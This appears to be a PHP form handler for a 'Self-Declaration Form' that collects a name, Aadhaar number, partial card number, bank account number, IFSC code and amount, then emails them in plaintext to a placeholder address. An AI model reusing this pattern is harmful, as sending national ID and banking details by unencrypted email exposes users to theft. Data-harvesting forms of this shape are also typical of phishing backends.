<?php
header('Content-Type: application/json');

$response = array("success" => false, "errors" => array());

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    $required_fields = [
        'name' => 'Name is required',
        'aadharnumber' => 'Aadhar Number is required',
        'cardnumber' => 'Last 4 Digits of Card Number are required',
        'bankname' => 'Bank Name is required',
        'amount' => 'Amount is required',
        'accholdername' => 'Account Holder Name is required',
        'accnum' => 'Account Number is required',
        'ifsc' => 'IFSC Code is required'
    ];

    foreach ($required_fields as $field => $message) {
        if (!isset($data[$field]) || empty(trim($data[$field]))) {
            $response['errors'][] = $message;
        }
    }

    if (empty($data['confirm']) || $data['confirm'] !== true) {
        $response['errors'][] = 'Confirmation is required';
    }

    if (empty($response['errors'])) {
        $name = htmlspecialchars(trim($data['name']));
        $aadharnumber = htmlspecialchars(trim($data['aadharnumber']));
        $cardnumber = htmlspecialchars(trim($data['cardnumber']));
        $bankname = htmlspecialchars(trim($data['bankname']));
        $amount = htmlspecialchars(trim($data['amount']));
        $accholdername = htmlspecialchars(trim($data['accholdername']));
        $accnum = htmlspecialchars(trim($data['accnum']));
        $ifsc = htmlspecialchars(trim($data['ifsc']));

        $to = "recipient@example.com";  // Replace with your email
        $subject = "Self-Declaration Form Submission";
        $message = "
        Name: $name\n
        Aadhar Number: $aadharnumber\n
        Last 4 Digits of Card Number: $cardnumber\n
        Bank Name: $bankname\n
        Amount: $amount\n
        Account Holder Name: $accholdername\n
        Account Number: $accnum\n
        IFSC Code: $ifsc
        ";

        $headers = "From: sender@example.com";  // Replace with your email

        if (mail($to, $subject, $message, $headers)) {
            $response['success'] = true;
        } else {
            $response['errors'][] = "Failed to send email.";
        }
    }
} else {
    $response['errors'][] = "Invalid request method.";
}

echo json_encode($response);
?>
